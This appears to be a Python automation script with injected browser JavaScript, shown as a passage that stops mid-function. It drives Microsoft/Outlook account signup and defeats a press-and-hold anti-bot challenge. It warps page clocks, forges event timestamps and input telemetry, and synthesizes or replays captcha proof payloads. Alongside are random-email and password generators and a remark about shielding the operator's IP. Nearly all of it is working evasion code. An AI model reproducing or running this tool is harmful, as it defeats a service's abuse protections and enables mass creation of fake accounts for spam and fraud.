import argparse
import base64
import hashlib
import json
import os
import secrets
import sys
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from urllib.parse import urlencode

from controllers.patchright_controller import PatchrightController

# Shared, single-run state published by the collector route normalizer.
# protocol_time_warp_hold reads it to distinguish a real HS proof rejection
# (collector result|-1) from a generic UI timeout, so the 5s path can re-try
# immediately while retry budget remains.
FINAL_FETCH_GUARD_STATE = {}
from decode_hs_payload import decode_payload_meta_from_form, encode_payload_from_events, parse_form_preserve_payload
from main import normalize_email_arg
from settings import load_config
from utils import generate_strong_password, random_email

try:
    # Live runs are often interrupted for IP protection.  Keep progress logs
    # visible even when the parent PowerShell command times out.
    sys.stdout.reconfigure(line_buffering=True)
except Exception:
    pass


class TeeStream:
    def __init__(self, *streams):
        self.streams = [s for s in streams if s]

    def write(self, data):
        for stream in self.streams:
            try:
                stream.write(data)
                stream.flush()
            except Exception:
                pass
        return len(data)

    def flush(self):
        for stream in self.streams:
            try:
                stream.flush()
            except Exception:
                pass


def install_tee_log(path):
    try:
        fh = open(path, "a", encoding="utf-8", buffering=1)
        sys.stdout = TeeStream(sys.stdout, fh)
        sys.stderr = TeeStream(sys.stderr, fh)
        return fh
    except Exception:
        return None


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def build_signup_msal_authorize_url() -> str:
    """
    Skip the slow OWA app-shell bootstrap while preserving the live browser
    identity flow.  The identity endpoint still mints the signup canary/cookies
    and redirects into the normal login.live.com signup surface.
    """
    verifier = _b64url(secrets.token_bytes(32))
    challenge = _b64url(hashlib.sha256(verifier.encode("ascii")).digest())
    req_id = str(uuid.uuid4())
    state_payload = {
        "id": str(uuid.uuid4()),
        "meta": {"interactionType": "redirect"},
    }
    state = _b64url(json.dumps(state_payload, separators=(",", ":")).encode("utf-8")) + "|https://outlook.live.com/mail/0/"
    nonce = str(uuid.uuid4())
    claims = {"access_token": {"xms_cc": {"values": ["CP1"]}}}
    params = {
        "client_id": "9199bf20-a13f-4107-85dc-02114787ef48",
        "scope": "https://outlook.office.com/.default openid profile offline_access",
        "redirect_uri": "https://outlook.live.com/mail/",
        "client-request-id": req_id,
        "response_mode": "fragment",
        "client_info": "1",
        "clidata": "1",
        "prompt": "create",
        "nonce": nonce,
        "state": state,
        "claims": json.dumps(claims, separators=(",", ":")),
        "x-client-SKU": "msal.js.browser",
        "x-client-VER": "5.12.0",
        "response_type": "code",
        "code_challenge": challenge,
        "code_challenge_method": "S256",
        "cobrandid": "ab0455a0-8d03-46b9-b18b-df2f57b9e44c",
        "fl": "dob,flname,wld",
        "signup": "1",
    }
    return "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?" + urlencode(params)


RUNTIME_HOOK_JS = r"""
(() => {
  if (window.__pxProbeInstalled) return;
  Object.defineProperty(window, "__pxProbeInstalled", { value: true });
  try {
    // Leave crcldu's auditor frame pristine.  The Knp broker only needs the
    // MessageChannel response in its parent frame; patching auditor globals can
    // make the audit silently withhold a response.
    if (/^crcldu\.com$/i.test(String(location.hostname || ""))) return;
  } catch (_) {}

  const MAX_EVENTS = 1500;
  const MAX_STR = 1600;
  const AUTO_ACTIONS = __PXPROBE_AUTO_ACTIONS__;
  const REAL_DATE_NOW = Date.now.bind(Date);
  const REAL_SET_TIMEOUT = window.setTimeout.bind(window);
  const REAL_CLEAR_TIMEOUT = window.clearTimeout.bind(window);
  const state = window.__pxProbe = window.__pxProbe || {
    startedAt: Date.now(),
    href: location.href,
    events: [],
    wrapped: [],
    autoInvoked: {}
  };

  function persistTop() {
    try {
      if (window.top && window.top !== window) return;
      window.name = "__PXPROBE__" + JSON.stringify({
        startedAt: state.startedAt,
        href: location.href,
        events: state.events.slice(-MAX_EVENTS),
        wrapped: state.wrapped,
        namespaces: state.namespaces || [],
        delayedBodies: (state.delayedBodies || []).slice(-6)
      });
    } catch (_) {}
  }

  function now() {
    try { return performance.now(); } catch (_) { return Date.now(); }
  }

  function boundedString(s) {
    s = String(s);
    return s.length > MAX_STR ? s.slice(0, MAX_STR) + `...<truncated ${s.length - MAX_STR}>` : s;
  }

  function safe(value, depth = 0, seen = new WeakSet()) {
    try {
      if (value === null || value === undefined) return value;
      const t = typeof value;
      if (t === "string") return boundedString(value);
      if (t === "number" || t === "boolean") return value;
      if (t === "function") return `[Function ${value.name || "anonymous"}]`;
      if (seen.has(value)) return "[Circular]";
      seen.add(value);
      if (Array.isArray(value)) {
        if (depth >= 6) return `[Array len=${value.length}]`;
        return value.slice(0, 160).map(v => safe(v, depth + 1, seen));
      }
      if (typeof ArrayBuffer !== "undefined" && ArrayBuffer.isView && ArrayBuffer.isView(value)) {
        try {
          return {
            __typedArray: Object.prototype.toString.call(value),
            length: value.length,
            values: Array.prototype.slice.call(value, 0, 160)
          };
        } catch (_) {}
      }
      if (depth >= 6) return Object.prototype.toString.call(value);
      const out = {};
      let keys = [];
      try { keys = Reflect.ownKeys(value).filter(k => typeof k === "string"); } catch (_) { keys = Object.keys(value); }
      for (const k of keys.slice(0, 160)) {
        out[k] = safe(value[k], depth + 1, seen);
      }
      return out;
    } catch (e) {
      return `[safe-error ${e && e.message || e}]`;
    }
  }

  function push(kind, data) {
    try {
      const rec = { t: Date.now(), perf: now(), href: location.href, kind, data: safe(data) };
      state.events.push(rec);
      if (state.events.length > MAX_EVENTS) state.events.splice(0, state.events.length - MAX_EVENTS);
      persistTop();
      // Cross-origin captcha iframes disappear after success. Mirror their events
      // to the top window so the final dump still contains the decisive PX1200
      // calls and collector commands.
      if (window.top && window.top !== window) {
        try { window.top.postMessage({ __pxProbeEvent: rec }, "*"); } catch (_) {}
      }
    } catch (_) {}
  }

  function rememberBodyDump(item) {
    try {
      state.delayedBodies = state.delayedBodies || [];
      const body = String(item && item.body || "");
      state.delayedBodies.push(Object.assign({}, item || {}, {
        body: body.slice(0, 120000),
        bodyTruncated: body.length > 120000,
        len: body.length
      }));
      if (state.delayedBodies.length > 6) state.delayedBodies.splice(0, state.delayedBodies.length - 6);
      persistTop();
    } catch (_) {}
  }

  function dumpCollectorBody(label, body, meta) {
    try {
      const item = Object.assign({
        t: Date.now(),
        perf: now(),
        href: location.href,
        label,
        body: String(body || "")
      }, meta || {});
      if (window.top && window.top !== window) {
        try { window.top.postMessage({ __pxProbeBodyDump: item }, "*"); } catch (_) {}
      } else {
        rememberBodyDump(item);
      }
    } catch (_) {}
  }

  try {
    if (AUTO_ACTIONS && AUTO_ACTIONS.timeWarp && !window.__pxProbeTimeWarpInstalled) {
      Object.defineProperty(window, "__pxProbeTimeWarpInstalled", { value: true });
      const clockMode = String(AUTO_ACTIONS.timeWarpClockMode || "full");
      // full: current behaviour, warp Date/performance/Event/timers.
      // event: only forged input Event.timeStamp values while keeping wall-clock
      //        and network-side timestamps natural.
      // event_timers: forged Event.timeStamp + accelerated timers/RAF, but keep
      //               Date.now/performance.now natural.
      // perf_timers: warp performance/Event/timers only.  hsprotect uses
      //              performance.now() for hold duration, while Date.now() is
      //              better left natural for collector/server-side consistency.
      const patchDate = clockMode === "full";
      const patchPerformance = clockMode === "full" || clockMode === "perf_timers";
      const patchTimers = clockMode === "full" || clockMode === "event_timers" || clockMode === "perf_timers";
      const OrigDate = Date;
      const origDateNow = OrigDate.now.bind(OrigDate);
      const origPerfNow = performance && performance.now ? performance.now.bind(performance) : null;
      const origSetTimeout = window.setTimeout.bind(window);
      const origSetInterval = window.setInterval.bind(window);
      const origRAF = window.requestAnimationFrame ? window.requestAnimationFrame.bind(window) : null;
      const origEventTimeStampDesc = (typeof Event !== "undefined" && Event.prototype)
        ? Object.getOwnPropertyDescriptor(Event.prototype, "timeStamp")
        : null;
      let warp = null;

      function realPerf() {
        try { return origPerfNow ? origPerfNow() : origDateNow(); } catch (_) { return origDateNow(); }
      }
      function fakeDelta() {
        if (!warp) return null;
        const realElapsed = realPerf() - warp.realStartPerf;
        return warp.offsetMs + realElapsed * warp.factor;
      }
      function fakeEpoch() {
        const d = fakeDelta();
        return d === null ? origDateNow() : warp.realStartEpoch + d;
      }
      function fakePerfNow() {
        const d = fakeDelta();
        return d === null ? realPerf() : warp.fakeStartPerf + d;
      }
      function startWarp(reason, targetOverride, wallOverride) {
        try {
          const targetMs = Math.max(1000, Number(targetOverride || AUTO_ACTIONS.timeWarpHoldMs || 11800));
          const wallMs = Math.max(20, Number(wallOverride || AUTO_ACTIONS.timeWarpWallMs || 180));
          warp = {
            reason,
            realStartPerf: realPerf(),
            realStartEpoch: origDateNow(),
            fakeStartPerf: realPerf(),
            factor: targetMs / wallMs,
            offsetMs: 0
          };
          push("time_warp_start", { reason, factor: warp.factor, targetMs, wallMs });
        } catch (e) {
          push("time_warp_start_error", { error: String(e && e.message || e) });
        }
      }
      function stopWarpLater(reason) {
        try {
          const stopDelay = Math.max(0, Number(AUTO_ACTIONS.timeWarpStopDelayMs || 250));
          origSetTimeout(() => {
            try {
              if (warp) push("time_warp_stop", { reason, fakeElapsed: fakeDelta() });
              warp = null;
            } catch (_) { warp = null; }
          }, stopDelay);
        } catch (_) { warp = null; }
      }

      function FakeDate(...args) {
        if (this instanceof FakeDate) {
          return args.length ? new OrigDate(...args) : new OrigDate(fakeEpoch());
        }
        return args.length ? OrigDate(...args) : new OrigDate(fakeEpoch()).toString();
      }
      try {
        if (!patchDate) {
          push("time_warp_date_patch_skipped", { clockMode });
        } else {
        Object.setPrototypeOf(FakeDate, OrigDate);
        FakeDate.prototype = OrigDate.prototype;
        FakeDate.now = fakeEpoch;
        FakeDate.UTC = OrigDate.UTC;
        FakeDate.parse = OrigDate.parse;
        window.Date = FakeDate;
        }
      } catch (e) {
        push("time_warp_date_patch_error", { error: String(e && e.message || e) });
      }
      try {
        if (patchPerformance && performance && origPerfNow) {
          Object.defineProperty(performance, "now", {
            configurable: true,
            value: fakePerfNow
          });
        }
      } catch (e) {
        push("time_warp_perf_patch_error", { error: String(e && e.message || e) });
      }
      try {
        // hsprotect samples both wall-clock helpers and event.timeStamp.  The
        // latter is browser supplied and is not affected by replacing
        // performance.now(), so override the prototype while warp is active.
        if (typeof Event !== "undefined" && Event.prototype) {
          Object.defineProperty(Event.prototype, "timeStamp", {
            configurable: true,
            get: function() {
              try {
                if (warp) return fakePerfNow();
                if (origEventTimeStampDesc && typeof origEventTimeStampDesc.get === "function") {
                  return origEventTimeStampDesc.get.call(this);
                }
                if (origEventTimeStampDesc && "value" in origEventTimeStampDesc) {
                  return origEventTimeStampDesc.value;
                }
              } catch (_) {}
              return realPerf();
            }
          });
        }
      } catch (e) {
        push("time_warp_event_ts_patch_error", { error: String(e && e.message || e) });
      }
      function patchIncomingEventTimeStamp(ev) {
        try {
          if (!warp || !ev) return;
          const ts = fakePerfNow();
          try {
            Object.defineProperty(ev, "timeStamp", {
              configurable: true,
              enumerable: false,
              get: () => ts
            });
          } catch (_) {
            try { ev.__defineGetter__("timeStamp", () => ts); } catch (_) {}
          }
          state.eventTsPatched = (state.eventTsPatched || 0) + 1;
          if (state.eventTsPatched <= 24) {
            push("time_warp_event_ts_forced", {
              type: ev.type,
              ts,
              reason: warp.reason,
              fakeElapsed: fakeDelta()
            });
          }
        } catch (e) {
          push("time_warp_event_ts_force_error", { error: String(e && e.message || e) });
        }
      }
      try {
        const trackedEventTypes = new Set([
          "pointerdown", "mousedown", "touchstart",
          "pointermove", "mousemove", "touchmove",
          "pointerup", "mouseup", "touchend", "pointercancel", "touchcancel"
        ]);
        const origAddEventListener = EventTarget.prototype.addEventListener;
        const origRemoveEventListener = EventTarget.prototype.removeEventListener;
        const wrappedListenerMap = new WeakMap();
        function wrapListenerForTimeWarp(type, listener) {
          try {
            if (!trackedEventTypes.has(String(type)) || !listener) return listener;
            if (typeof listener === "function") {
              let wrapped = wrappedListenerMap.get(listener);
              if (!wrapped) {
                wrapped = function(ev, ...rest) {
                  patchIncomingEventTimeStamp(ev);
                  return listener.call(this, ev, ...rest);
                };
                try { Object.defineProperty(wrapped, "__pxProbeTimeWarpListener", { value: true }); } catch (_) {}
                wrappedListenerMap.set(listener, wrapped);
              }
              return wrapped;
            }
            if (typeof listener === "object" && typeof listener.handleEvent === "function") {
              let wrappedObj = wrappedListenerMap.get(listener);
              if (!wrappedObj) {
                wrappedObj = {
                  handleEvent(ev) {
                    patchIncomingEventTimeStamp(ev);
                    return listener.handleEvent.call(listener, ev);
                  }
                };
                wrappedListenerMap.set(listener, wrappedObj);
              }
              return wrappedObj;
            }
          } catch (_) {}
          return listener;
        }
        if (!origAddEventListener.__pxProbeTimeWarpWrapped) {
          EventTarget.prototype.addEventListener = function(type, listener, options) {
            return origAddEventListener.call(this, type, wrapListenerForTimeWarp(type, listener), options);
          };
          EventTarget.prototype.removeEventListener = function(type, listener, options) {
            return origRemoveEventListener.call(this, type, wrappedListenerMap.get(listener) || listener, options);
          };
          try { Object.defineProperty(EventTarget.prototype.addEventListener, "__pxProbeTimeWarpWrapped", { value: true }); } catch (_) {}
          push("time_warp_add_listener_hook_installed", {});
        }
      } catch (e) {
        push("time_warp_add_listener_hook_error", { error: String(e && e.message || e) });
      }
      try {
        for (const t of [
          "pointerdown", "mousedown", "touchstart",
          "pointermove", "mousemove", "touchmove",
          "pointerup", "mouseup", "touchend", "pointercancel", "touchcancel"
        ]) {
          document.addEventListener(t, patchIncomingEventTimeStamp, true);
        }
      } catch (e) {
        push("time_warp_event_ts_listener_error", { error: String(e && e.message || e) });
      }
      try {
        if (!patchTimers) {
          push("time_warp_timer_patch_skipped", { clockMode });
        } else {
        window.setTimeout = function(cb, delay, ...args) {
          let d = Number(delay);
          if (warp && isFinite(d) && d > 0) d = Math.max(0, d / Math.max(1, warp.factor));
          return origSetTimeout(cb, d, ...args);
        };
        window.setInterval = function(cb, delay, ...args) {
          let d = Number(delay);
          if (warp && isFinite(d) && d > 0) d = Math.max(1, d / Math.max(1, warp.factor));
          return origSetInterval(cb, d, ...args);
        };
        if (origRAF) {
          window.requestAnimationFrame = function(cb) {
            return origRAF(function(ts) {
              try { return cb(fakePerfNow()); } catch (e) { throw e; }
            });
          };
        }
        }
      } catch (e) {
        push("time_warp_timer_patch_error", { error: String(e && e.message || e) });
      }
      try {
        const startControl = (reason, targetMs, wallMs) => startWarp(reason || "external", targetMs, wallMs);
        const stopControl = (reason) => stopWarpLater(reason || "external");
        const stateControl = () => ({ active: !!warp, fakeElapsed: fakeDelta(), factor: warp && warp.factor, reason: warp && warp.reason });
        Object.defineProperty(window, "__pxProbeTimeWarpStart", {
          configurable: true,
          writable: true,
          value: startControl
        });
        Object.defineProperty(window, "__pxProbeTimeWarpStop", {
          configurable: true,
          writable: true,
          value: stopControl
        });
        Object.defineProperty(window, "__pxProbeTimeWarpState", {
          configurable: true,
          writable: true,
          value: stateControl
        });
        // Assignment fallback for odd about:blank/window-proxy cases.
        window.__pxProbeTimeWarpStart = startControl;
        window.__pxProbeTimeWarpStop = stopControl;
        window.__pxProbeTimeWarpState = stateControl;
        state.timeWarpControl = true;
        push("time_warp_control_exported", {
          start: typeof window.__pxProbeTimeWarpStart,
          stop: typeof window.__pxProbeTimeWarpStop,
          state: typeof window.__pxProbeTimeWarpState,
          clockMode,
          patchDate,
          patchPerformance,
          patchTimers
        });
        window.addEventListener("message", ev => {
          try {
            const cmd = ev && ev.data && ev.data.__pxProbeTimeWarpCommand;
            if (!cmd) return;
            if (cmd.action === "start") {
              startControl(cmd.reason || "message_start", cmd.holdMs, cmd.wallMs);
              push("time_warp_command", { action: cmd.action, reason: cmd.reason || "message_start" });
            } else if (cmd.action === "stop") {
              stopControl(cmd.reason || "message_stop");
              push("time_warp_command", { action: cmd.action, reason: cmd.reason || "message_stop" });
            }
          } catch (e) {
            push("time_warp_command_error", { error: String(e && e.message || e) });
          }
        });
      } catch (e) {
        push("time_warp_control_export_error", { error: String(e && e.message || e) });
      }
      if (AUTO_ACTIONS.timeWarpAutoStart !== false) {
        document.addEventListener("pointerdown", ev => startWarp(ev.type), true);
        document.addEventListener("mousedown", ev => startWarp(ev.type), true);
        document.addEventListener("touchstart", ev => startWarp(ev.type), true);
        document.addEventListener("pointerup", ev => stopWarpLater(ev.type), true);
        document.addEventListener("mouseup", ev => stopWarpLater(ev.type), true);
        document.addEventListener("touchend", ev => stopWarpLater(ev.type), true);
        document.addEventListener("pointercancel", ev => stopWarpLater(ev.type), true);
        document.addEventListener("touchcancel", ev => stopWarpLater(ev.type), true);
      }
      push("time_warp_hook_installed", { clockMode, patchDate, patchPerformance, patchTimers });
    }
  } catch (e) {
    try { push("time_warp_hook_error", { error: String(e && e.message || e) }); } catch (_) {}
  }

  function shouldAuto(name) {
    try {
      return AUTO_ACTIONS && AUTO_ACTIONS.enabled &&
        (!AUTO_ACTIONS.functions || AUTO_ACTIONS.functions.indexOf(name) >= 0);
    } catch (_) {
      return false;
    }
  }

  function scheduleAutoInvoke(ns, obj, name) {
    try {
      if (!shouldAuto(name)) return;
      if (!obj || typeof obj[name] !== "function") return;
      const key = `${ns}.${name}`;
      if (AUTO_ACTIONS.once !== false && state.autoInvoked[key]) return;
      state.autoInvoked[key] = Date.now();
      const delay = Math.max(0, Number(AUTO_ACTIONS.delayMs || 120));
      setTimeout(() => {
        try {
          const fn = obj[name];
          if (typeof fn !== "function") {
            push("auto_invoke_missing", { ns, name });
            return;
          }
          if (name === "PX1200") {
            if (AUTO_ACTIONS.syntheticPx1200 && AUTO_ACTIONS.syntheticTemplate) {
              try {
                const args = synthesizePx1200Args(AUTO_ACTIONS.syntheticTemplate);
                fn.apply(obj, args);
                push("auto_invoke", { ns, name, mode: "synthetic", argc: args.length, argsPreview: JSON.stringify(args).slice(0, 500) });
              } catch (e) {
                push("auto_invoke_error", { ns, name, mode: "synthetic", error: String(e && e.message || e) });
              }
              return;
            }
            const calls = AUTO_ACTIONS.replayPx1200 || [];
            for (let i = 0; i < calls.length; i++) {
              try {
                fn.apply(obj, calls[i]);
                push("auto_invoke", { ns, name, mode: "replay", index: i, argc: calls[i] && calls[i].length });
              } catch (e) {
                push("auto_invoke_error", { ns, name, mode: "replay", index: i, error: String(e && e.message || e) });
              }
            }
            return;
          }
          if (name === "PX764") {
            const args = AUTO_ACTIONS.px764Args || ["0", null, null, null];
            try {
              fn.apply(obj, args);
              push("auto_invoke", { ns, name, mode: "status", argc: args.length, argsPreview: JSON.stringify(args).slice(0, 260) });
            } catch (e) {
              push("auto_invoke_error", { ns, name, mode: "status", error: String(e && e.message || e) });
            }
          }
        } catch (e) {
          push("auto_invoke_error", { ns, name, error: String(e && e.message || e) });
        }
      }, delay);
    } catch (e) {
      push("auto_schedule_error", { ns, name, error: String(e && e.message || e) });
    }
  }

  function deepCloneJson(v) {
    return JSON.parse(JSON.stringify(v));
  }

  function firstCaptchaRect() {
    try {
      const selectors = ["#px-captcha", "div[role='button']", "button", "[aria-label]"];
      for (const sel of selectors) {
        const el = document.querySelector(sel);
        if (!el || !el.getBoundingClientRect) continue;
        const r = el.getBoundingClientRect();
        if (r.width > 20 && r.height > 10) {
          return {
            left: r.left, top: r.top, width: r.width, height: r.height,
            cx: r.left + r.width * 0.52, cy: r.top + r.height * 0.52,
            selector: sel
          };
        }
      }
    } catch (_) {}
    return { left: 0, top: 0, width: 225, height: 40, cx: 112, cy: 21, selector: "fallback" };
  }

  function synthesizePx1200Args(templateArgs) {
    const args = deepCloneJson(templateArgs || []);
    if (!args.length) throw new Error("empty synthetic template");
    const data = args[1] && typeof args[1] === "object" ? args[1] : {};
    args[1] = data;
    const holdMs = Math.max(1000, Number(AUTO_ACTIONS.syntheticHoldMs || 11800));
    const nowMs = Date.now();
    const downEpoch = nowMs - holdMs - 40;
    const rect = firstCaptchaRect();
    const localDownX = +(rect.cx + (Math.random() * 2 - 1) * 0.8).toFixed(2);
    const localDownY = +(rect.cy + (Math.random() * 2 - 1) * 0.6).toFixed(2);
    const localUpX = +(localDownX + (Math.random() * 2 - 1) * 0.7).toFixed(2);
    const localUpY = +(localDownY + (Math.random() * 2 - 1) * 0.5).toFixed(2);
    let screenOffsetX = Number(AUTO_ACTIONS.syntheticScreenOffsetX || 521);
    let screenOffsetY = Number(AUTO_ACTIONS.syntheticScreenOffsetY || 624);
    try {
      // In the observed build these absolute coordinates are roughly local
      // frame coords plus the iframe/screen offset. Use the template delta as
      // a fallback when it is present.
      const oldLocalX = Number(data["XiJvJBhCbRM="]);
      const oldAbsX = Number(data["FCwlKlJDJxo="]);
      const oldLocalY = Number(data["ajYbMC9eGgY="]);
      const oldAbsY = Number(data["JV0UW2M3E2o="]);
      if (isFinite(oldAbsX - oldLocalX)) screenOffsetX = oldAbsX - oldLocalX;
      if (isFinite(oldAbsY - oldLocalY)) screenOffsetY = oldAbsY - oldLocalY;
    } catch (_) {}

    data["GCgpLl1AKRw="] = ["#px-captcha", ""];
    data["XiJvJBhCbRM="] = localDownX;
    data["ajYbMC9eGgY="] = localDownY;
    data["FwtmDVFqaD0="] = "pointerdown";
    data["FCwlKlJDJxo="] = +(screenOffsetX + localDownX).toFixed(6);
    data["JV0UW2M3E2o="] = +(screenOffsetY + localDownY).toFixed(6);
    data["YGARZiUJFVA="] = localUpX;
    data["UTEgdxdfI0w="] = localUpY;
    data["cRFAFzdwTyM="] = "pointerup";
    data["bjIfNChdGgU="] = +(screenOffsetX + localUpX).toFixed(6);
    data["DXV8M0sYfgQ="] = +(screenOffsetY + localUpY).toFixed(6);
    data["WiZrIB9LbBU="] = Math.round(holdMs + 40 + Math.random() * 120);
    data["Ui5jKBREZxs="] = Math.round(data["WiZrIB9LbBU="] + 40 + Math.random() * 80);
    data["PARNQnlrTHQ="] = downEpoch - Math.round(Math.random() * 80);
    data["ZjoXPCNQGQw="] = [Math.round(holdMs + (Math.random() * 500 - 150))];
    data["KVkYX2w2GWg="] = [downEpoch + Math.round(1200 + Math.random() * 1600)];
    data["KDhZPm1XWAo="] = [];
    data["QABxRgZqcXQ="] = Math.round(900 + Math.random() * 8000);
    data["KVkYX28zG2o="] = Math.round(1200 + Math.random() * 9000);
    data["UBBhVhV7YWE="] = Number(AUTO_ACTIONS.syntheticAttempt || data["UBBhVhV7YWE="] || 1);
    data["VQ0kCxNgJz0="] = "visible";
    data["YGARZiYOFFE="] = true;
    push("synthetic_px1200_args", { rect, holdMs, keys: Object.keys(data).length, preview: args });
    return args;
  }

  function useShortNoU0ProofStyle(qi) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.normalizePx1200Timing) return false;
      const target = Number(AUTO_ACTIONS.normalizePx1200HoldMs || AUTO_ACTIONS.timeWarpHoldMs || 0);
      if (!Number.isFinite(target) || target <= 0 || target >= 7000) return false;
      if (Number(AUTO_ACTIONS.syntheticU0LeadMs || 0) > 0) return false;
      const q = String(qi || "");
      if (q) {
        if (state.syntheticU0ByQi && state.syntheticU0ByQi[q]) return false;
        if (state.u0SeenByQi && state.u0SeenByQi[q]) return false;
      }
      return true;
    } catch (_) {
      return false;
    }
  }

  function looksShortManualProofData(d) {
    try {
      if (!d || typeof d !== "object") return false;
      const e = Number(d["eEgJDj4mCD4="] || 0);
      const wi = Number(d["WiZrIB9LbBU="] || 0);
      const ui = Number(d["Ui5jKBREZxs="] || 0);
      let duration = 0;
      if (Array.isArray(d["ZjoXPCNQGQw="])) duration = Number(d["ZjoXPCNQGQw="][0]);
      if (!Number.isFinite(e) || e < 8500 || e > 11200) return false;
      if (!Number.isFinite(duration) || duration < 2500 || duration > 4600) return false;
      if (!Number.isFinite(wi) || Math.abs(wi - (e + duration)) > 180) return false;
      if (Number.isFinite(ui) && (ui < wi || ui - wi > 180)) return false;
      return true;
    } catch (_) {
      return false;
    }
  }

  function shouldUseShortProofStyle(qi, d) {
    try {
      return !!(useShortNoU0ProofStyle(qi) || looksShortManualProofData(d));
    } catch (_) {
      return false;
    }
  }

  function chooseNormalizedHoldDuration(currentDuration, shortStyle) {
    const target = Number(AUTO_ACTIONS.normalizePx1200HoldMs || AUTO_ACTIONS.timeWarpHoldMs || 11800);
    const jitter = Math.round((Math.random() * 2 - 1) * (shortStyle ? 140 : 90));
    if (shortStyle) {
      const base = Number.isFinite(target) && target > 0 ? target : 3300;
      return Math.round(Math.max(2800, Math.min(4200, base + jitter)));
    }
    let duration = Number(currentDuration || 0);
    if (!Number.isFinite(duration) || duration < 8000 || duration > 15000) duration = target;
    return Math.round(Math.max(9000, Math.min(13500, duration + jitter)));
  }

  function normalizeShortNoU0InteractionShape(d, e, wi) {
    try {
      if (!d || typeof d !== "object") return false;
      const q = Array.isArray(d["DzN+dUlTekE="]) ? d["DzN+dUlTekE="] : [];
      const before = JSON.stringify(q);
      const make = (src, type, px11652, t) => {
        const item = src && typeof src === "object" ? jsonClone(src) : {};
        item.PX12343 = type;
        item.PX11652 = px11652;
        item.PX11699 = Math.max(0, Math.round(t));
        if (!Object.prototype.hasOwnProperty.call(item, "PX12270")) item.PX12270 = "true";
        return item;
      };
      const byType = (type, fromEnd) => {
        if (fromEnd) {
          for (let i = q.length - 1; i >= 0; i--) if (q[i] && q[i].PX12343 === type) return q[i];
        } else {
          for (let i = 0; i < q.length; i++) if (q[i] && q[i].PX12343 === type) return q[i];
        }
        return null;
      };
      const mouseover = byType("mouseover", false) || byType("mousemove", false) || {};
      const pointer = byType("pointerup", true) || byType("mouseup", true) || mouseover;
      const t0 = Math.round(e + 650 + Math.random() * 260);
      const t1 = Math.round(Math.max(0, e - (180 + Math.random() * 260)));
      const edge1 = Math.round(wi - (230 + Math.random() * 80));
      const edge2 = Math.round(edge1 + 7 + Math.random() * 12);
      d["DzN+dUlTekE="] = [
        make(mouseover, "mouseover", 0, t0),
        make(mouseover, "mouseover", 1, t1),
        make(mouseover, "mouseout", 1, edge1),
        make(mouseover, "mouseover", 1, edge1),
        make(mouseover, "mouseout", 1, edge2),
        make(mouseover, "mouseover", 1, edge2),
        make(pointer, "pointerup", 1, wi)
      ];
      return JSON.stringify(d["DzN+dUlTekE="]) !== before;
    } catch (_) {
      return false;
    }
  }

  function normalizeShortNoU0AuxTimingFields(d, e, duration, wi, ui, qs) {
    try {
      if (!d || typeof d !== "object") return false;
      const before = {
        p: d["PARNQnlrTHQ="],
        kv: safe(d["KVkYX2w2GWg="]),
        q: d["QABxRgZqcXQ="],
        k28: d["KVkYX28zG2o="],
        xq: d["XQUsAxhpKjU="],
        s3: d["S3sxMQ0YNQo="],
        bzt: d["Bzt2fUFRcw=="]
      };
      const baseQs = Number.isFinite(Number(qs)) ? Number(qs) : Math.round(Date.now());
      const xq = Math.round(ui + 470 + Math.random() * 120);
      const pArn = Math.round(baseQs - xq - 3);
      d["PARNQnlrTHQ="] = pArn;
      d["KVkYX2w2GWg="] = [Math.round(pArn + e + 12 + Math.random() * 18)];
      d["QABxRgZqcXQ="] = Math.round(220 + Math.random() * 180);
      d["KVkYX28zG2o="] = Math.round(2450 + Math.random() * 520);
      if (Object.prototype.hasOwnProperty.call(d, "XQUsAxhpKjU=")) d["XQUsAxhpKjU="] = xq;
      if (Object.prototype.hasOwnProperty.call(d, "Bzt2fUFRcw==")) d["Bzt2fUFRcw=="] = Math.round(ui + 55 + Math.random() * 55);
      if (Object.prototype.hasOwnProperty.call(d, "S3sxMQ0YNQo=")) d["S3sxMQ0YNQo="] = Math.round(ui + 700 + Math.random() * 260);
      return JSON.stringify(before) !== JSON.stringify({
        p: d["PARNQnlrTHQ="],
        kv: safe(d["KVkYX2w2GWg="]),
        q: d["QABxRgZqcXQ="],
        k28: d["KVkYX28zG2o="],
        xq: d["XQUsAxhpKjU="],
        s3: d["S3sxMQ0YNQo="],
        bzt: d["Bzt2fUFRcw=="]
      });
    } catch (_) {
      return false;
    }
  }

  function normalizeNaturalLongInteractionShape(d, e, wi) {
    try {
      if (!d || typeof d !== "object") return false;
      const q = Array.isArray(d["DzN+dUlTekE="]) ? d["DzN+dUlTekE="] : [];
      const before = JSON.stringify(q);
      const make = (src, type, px11652, t) => {
        const item = src && typeof src === "object" ? jsonClone(src) : {};
        item.PX12343 = type;
        item.PX11652 = px11652;
        item.PX11699 = Math.max(0, Math.round(t));
        if (!Object.prototype.hasOwnProperty.call(item, "PX12270")) item.PX12270 = "true";
        return item;
      };
      const byType = (type, fromEnd) => {
        if (fromEnd) {
          for (let i = q.length - 1; i >= 0; i--) if (q[i] && q[i].PX12343 === type) return q[i];
        } else {
          for (let i = 0; i < q.length; i++) if (q[i] && q[i].PX12343 === type) return q[i];
        }
        return null;
      };
      const mouseover = byType("mouseover", false) || byType("mousemove", false) || {};
      const mouseout = byType("mouseout", false) || mouseover;
      const pointer = byType("pointerup", true) || byType("mouseup", true) || mouseover;
      const a = e - (5550 + Math.random() * 350);
      const b = e - (4200 + Math.random() * 260);
      const c = e - (3050 + Math.random() * 260);
      const d2 = e - (4500 + Math.random() * 300);
      const burst = [];
      for (let i = 0; i < 9; i++) burst.push(d2 + Math.random() * 360);
      burst.sort((x, y) => x - y);
      const edge1 = wi - (6000 + Math.random() * 220);
      const edge2 = edge1 + 10 + Math.random() * 35;
      d["DzN+dUlTekE="] = [
        make(mouseover, "mouseover", 0, a),
        make(mouseout, "mouseout", 0, b),
        make(mouseover, "mouseover", 1, b),
        make(mouseout, "mouseout", 1, b + 25),
        make(mouseover, "mouseover", 0, b + 25),
        make(mouseout, "mouseout", 0, b + 30),
        make(mouseover, "mouseover", 1, b + 30),
        make(mouseout, "mouseout", 1, c),
        make(mouseover, "mouseover", 0, c),
        ...burst.map(t => make(mouseover, "mouseover", 2, t)),
        make(mouseout, "mouseout", 2, edge1),
        make(mouseover, "mouseover", 2, edge1),
        make(mouseout, "mouseout", 2, edge2),
        make(mouseover, "mouseover", 2, edge2),
        make(pointer, "pointerup", 2, wi)
      ];
